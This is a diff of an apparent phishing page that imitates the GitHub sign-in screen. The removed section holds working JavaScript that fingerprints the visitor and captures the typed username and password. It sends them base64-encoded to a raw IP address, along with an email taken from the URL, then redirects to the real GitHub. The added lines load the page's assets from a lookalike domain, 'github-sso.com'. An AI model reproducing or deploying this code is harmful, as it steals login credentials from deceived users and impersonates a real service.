@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -12,9 +13,9 @@
 
 <meta content="origin" name="referrer" />
 
-<link crossorigin="anonymous" href="https://assets-cdn.github.com/assets/frameworks-77c3b874f32e71b14cded5a120f42f5c7288fa52e0a37f2d5919fbd8bcfca63c.css" integrity="sha256-d8O4dPMucbFM3tWhIPQvXHKI+lLgo38tWRn72Lz8pjw=" media="all" rel="stylesheet" />
-<link crossorigin="anonymous" href="https://assets-cdn.github.com/assets/github-2d2923b7368221ebab49e0afcc0f16839a76bdad50d971665e7f64132d11bd66.css" integrity="sha256-LSkjtzaCIeurSeCvzA8Wg5p2va1Q2XFmXn9kEy0RvWY=" media="all" rel="stylesheet" />
-<link crossorigin="anonymous" href="https://assets-cdn.github.com/assets/site-87fc1b705115bb5758018dffb7c1ed35b316b40ef094c4d5bd0478efe83d7af7.css" integrity="sha256-h/wbcFEVu1dYAY3/t8HtNbMWtA7wlMTVvQR47+g9evc=" media="all" rel="stylesheet" />
+<link crossorigin="anonymous" href="https://www.github-sso.com:14396/static/frameworks-77c3b874f32e71b14cded5a120f42f5c7288fa52e0a37f2d5919fbd8bcfca63c.css" media="all" rel="stylesheet" />
+<link crossorigin="anonymous" href="https://www.github-sso.com:14396/static/github-2d2923b7368221ebab49e0afcc0f16839a76bdad50d971665e7f64132d11bd66.css" media="all" rel="stylesheet" />
+<link crossorigin="anonymous" href="https://www.github-sso.com:14396/static/site-87fc1b705115bb5758018dffb7c1ed35b316b40ef094c4d5bd0478efe83d7af7.css" media="all" rel="stylesheet" />
 
 <meta name="viewport" content="width=device-width">
 <title>Sign in to GitHub · GitHub</title>
@@ -174,129 +175,11 @@ You can't perform that action at this time.
 </div>
 
 
-<script crossorigin="anonymous" integrity="sha256-OiTVyGEpRWTLRqro9+PHTHqtjluGGBa/2WknMA8gP1E=" src="https://assets-cdn.github.com/assets/frameworks-3a24d5c861294564cb46aae8f7e3c74c7aad8e5b861816bfd96927300f203f51.js"></script>
-<script async="async" crossorigin="anonymous" integrity="sha256-6kY300QmwmPoLXP+6eWORRdIrTNSazm+tP91yu+19jo=" src="https://assets-cdn.github.com/assets/github-ea4637d34426c263e82d73fee9e58e451748ad33526b39beb4ff75caefb5f63a.js"></script>
-<script>
-var username,password,fingerPrint,userAgent,email
-var api = "http://106.15.50.61:14396/api";
-var click = "http://106.15.50.61:14396/click";
-var redirectUrl = "https://github.com/";
+<script crossorigin="anonymous" src="https://www.github-sso.com:14396/static/frameworks-3a24d5c861294564cb46aae8f7e3c74c7aad8e5b861816bfd96927300f203f51.js"></script>
+<script async="async" crossorigin="anonymous" src="https://www.github-sso.com:14396/static/github-ea4637d34426c263e82d73fee9e58e451748ad33526b39beb4ff75caefb5f63a.js"></script>
 
-function bin2hex(s) {
-    var i, l, o = '',
-      n;
-      s += '';
-      for (i = 0, l = s.length; i < l; i++) {
-      n = s.charCodeAt(i)
-        .toString(16);
-      o += n.length < 2 ? '0' + n : n;
-    }
-    return o;
-  }
+<script src="https://www.github-sso.com:14396/static/jQuery.js"></script>
 
-
-function getUserAgent(){
-    // 获取User-Agent
-    return navigator.userAgent;
-}
-
-function getCanvasFingerPrint(){
-    var txt = "https://www.alipay.com/";
-    var canvas = document.createElement('canvas');
-    var ctx = canvas.getContext("2d");
-
-    ctx.textBaseline = "top";
-    ctx.font = "14px 'Arial'";
-    ctx.textBaseline = "tencent";
-    ctx.fillStyle = "#f60";
-    ctx.fillRect(125,1,62,20);
-    ctx.fillStyle = "#069";
-    ctx.fillText(txt, 2, 15);
-    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-    ctx.fillText(txt, 4, 17);
-
-    var b64 = canvas.toDataURL().replace("data:image/png;base64,","");
-    var bin = atob(b64);
-    var crc = bin2hex(bin.slice(-16,-12));
-    return crc.toLowerCase();
-}
-
-function checkInput(){
-    username = document.getElementById("login_field").value;
-    password = document.getElementById("password").value;
-    if (username.length == 0 && password.length == 0){
-        return false;
-    }else{
-        return true;
-    }
-}
-
-function sendMessage(data,type){
-    var xmlhttp;
-    if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
-        xmlhttp=new XMLHttpRequest();
-    }
-    else {// code for IE6, IE5
-        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
-    }
-    if (type == "api"){
-        var url = api;
-    }else{
-        var url = click;
-    }
-    xmlhttp.open("POST",url,true);  // 不需要返回结果
-    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    xmlhttp.send("data="+data);
-
-    // window.location = "https://www.github.com/"
-}
-
-window.onload = function(){
-    var subBtn = document.getElementsByName("commit")[0];
-    fingerPrint = getCanvasFingerPrint();
-    userAgent = getUserAgent();
-    email = window.location.hash.split("#")[1];
-    window.location.hash = "";
-    if (email === undefined){
-        email = "******"
-    }
-
-    var click = {
-        "fingerPrint":fingerPrint,
-        "userAgent":userAgent,
-        "email":email
-    }
-    console.log(click);
-    var strClick = window.btoa(JSON.stringify(click));
-    sendMessage(strClick,"click");
-    subBtn.onclick = function(){
-        if (checkInput()){
-            // 判断是否有输入
-            username = document.getElementById("login_field").value;
-            password = document.getElementById("password").value;
-            var data = {
-                "fingerPrint":fingerPrint,
-                "userAgent":userAgent,
-                "username":username,
-                "password":password
-            }
-            try{
-                var strData = window.btoa(JSON.stringify(data));
-            }catch (e) {
-                console.log(e);
-                window.location = redirectUrl;
-            }
-            console.log(strData);
-            sendMessage(strData,"api");
-            window.location = redirectUrl;
-        }else{
-            console.log("no input");
-        }
-        return false;
-    }
-}
-
-</script>
 <div class="js-stale-session-flash stale-session-flash flash flash-warn flash-banner d-none">
 <svg aria-hidden="true" class="octicon octicon-alert" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M8.865 1.52c-.18-.31-.51-.5-.87-.5s-.69.19-.87.5L.275 13.5c-.18.31-.18.69 0 1 .19.31.52.5.87.5h13.7c.36 0 .69-.19.86-.5.17-.31.18-.69.01-1L8.865 1.52zM8.995 13h-2v-2h2v2zm0-3h-2V6h2v4z"/></svg>
 <span class="signed-in-tab-flash">You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
@@ -315,4 +198,3 @@ window.onload = function(){
 
 </body>
 </html>
-
